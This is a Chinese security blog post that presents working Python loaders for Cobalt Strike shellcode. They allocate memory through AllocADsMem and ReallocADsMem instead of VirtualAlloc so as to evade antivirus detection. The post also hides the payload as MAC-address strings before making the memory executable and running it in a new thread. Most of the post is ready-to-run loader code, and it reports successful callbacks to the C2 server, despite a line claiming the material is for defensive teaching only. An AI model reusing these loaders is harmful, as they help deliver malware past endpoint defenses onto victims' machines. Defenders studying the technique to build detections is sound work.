> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CSi7iQCg25AIfmqWNAYrhQ)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSOQ9SWrLfzL4apvGB2FhZe46WXEHMneBZkic7vBtA7LotDtaC8DdqkLGVxdCcUj4Hm1Zb0W55CdqKg/640?wx_fmt=jpeg)

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

**内存申请**  

在现在许多的 **shellcode 加载器**中，内存申请是必不可少的一部分，常用的就是 VirtualAlloc 函数来申请一块动态内存来存放我们的 shellcode。  

再后来，为了逃避检测申请内存的行为，采用了渐进式加载模式，也就是申请一块可读可写不可执行的内存，使用 VirtualProtect 函数将内存区块设置为可执行，从而规避检测。

然而现在也有杀软对 VirtualAlloc 和 VirtualProtect 连用进行查杀。。。。

新发现

在前几天找《[mac，ipv4](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485833&idx=1&sn=82c2f120b6c5058dc9afcc4eeefb89b5&chksm=97743568a003bc7e9e62e90d2353ecb17c2761a492b494417290b85e7fd39a8da3d9c5d6d249&scene=21#wechat_redirect)》那些内存加载函数时，一同发现了两个有意思的 AllocADsMem 和 ReallocADsMem 函数，竟然能申请内存？哎嗨？好玩。今就研究研究能利用一下不。

函数介绍

AllocADsMem  

该函数在 Activeds.dll 库中，可以分配的指定大小的存储块。

函数原型：  

```
https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-allocadsmem
```

```
LPVOID AllocADsMem(
  DWORD cb
);
```

参数是要分配的内存大小，成功调用则返回一个指向已分配内存的非 NULL 指针， 如果不成功，则返回 NULL。  

看这描述就是申请一个内存啊，但是测试发现该内存可读可写不可执行，所以可以用 VirtualProtect 修改为可执行属性

```
ptr1 = ctypes.windll.Activeds.AllocADsMem(len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr1, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
```

ReallocADsMem

该函数在 Activeds.dll 库中，可以复制指定内存内容，并新申请一块内存用来存储

函数原型：  

```
https://docs.microsoft.com/en-us/windows/win32/api/adshlp/nf-adshlp-reallocadsmem
```

```
LPVOID ReallocADsMem(
  LPVOID pOldMem,
  DWORD  cbOld,
  DWORD  cbNew
);
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOQ9SWrLfzL4apvGB2FhZe4ZQT8cYjPk8lMCicfVTVw3zKdbdASgrdSxQR0g9fOVz5CUQzuUHJYDTA/640?wx_fmt=png)

调用成功返回一个指向新分配内存的指针，否则返回 NULL。  

看介绍啊，这个函数干了两个函数的事，申请内存和复制内存，但是只能从内存中复制

但是我们就是愁怎么往内存中复制内容，所以这个函数看着很鸡肋

但是突发奇想，这函数能不能混淆视线，用 AllocADsMem 申请的内存我不用就是玩，我用 ReallocADsMem 将内容复制出来申请一个新内存，将该内存改为可执行。

```
ptr2 = ctypes.windll.Activeds.ReallocADsMem(ptr,len(shellcode),len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr2, len(shellcode), 0x40, ctypes.byref(ctypes.c_long(1)))
```

测试

使用的 **mac 加载器**，测试的将 VirtualAlloc 替换为 AllocADsMem 函数，并改为可执行内存  

环境 py2.7，使用 cs 生成的 64 位 shellcode

```
import ctypes

shellcode = b"\xfc\x48\x83\"

macmem = ctypes.windll.Activeds.AllocADsMem(len(shellcode)/6*17)
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)

list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)

ptr = ctypes.windll.Activeds.AllocADsMem(len(list)*6)
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6

ctypes.windll.kernel32.VirtualProtect(ptr, len(list)*6, 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

成功上线  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOQ9SWrLfzL4apvGB2FhZe4XGCqYrz9SPjlyKVlEwwQXHlwaLbF6HiaNKjjEy5fYuD4JN1d24Ns32Q/640?wx_fmt=png)

接下来用 ReallocADsMem 来混淆一下视线，AllocADsMem 申请的内存可读可写即可，ReallocADsMem 申请的内存改为可执行  

相同环境，测试上线

```
import ctypes

shellcode = b"\xfc\x48\x83......"

macmem = ctypes.windll.Activeds.AllocADsMem(len(shellcode)/6*17)
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)

list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)

ptr = ctypes.windll.Activeds.AllocADsMem(len(list)*6)
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6

ptr2 = ctypes.windll.Activeds.ReallocADsMem(ptr,len(list)*6,len(list)*6)
ctypes.windll.kernel32.VirtualProtect(ptr2, len(list)*6, 0x40,ctypes.byref(ctypes.c_long(1)))

handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr2, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

依旧成功上线  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOQ9SWrLfzL4apvGB2FhZe4libkZMCiaDFFKjzjw6nCjL7pETK2BO6tasx1hsaK41CvwpibZJr0EbNaw/640?wx_fmt=png)

小结

免杀没有测试，只是分享思路，申请内存函数不只是那一个能用。

公众号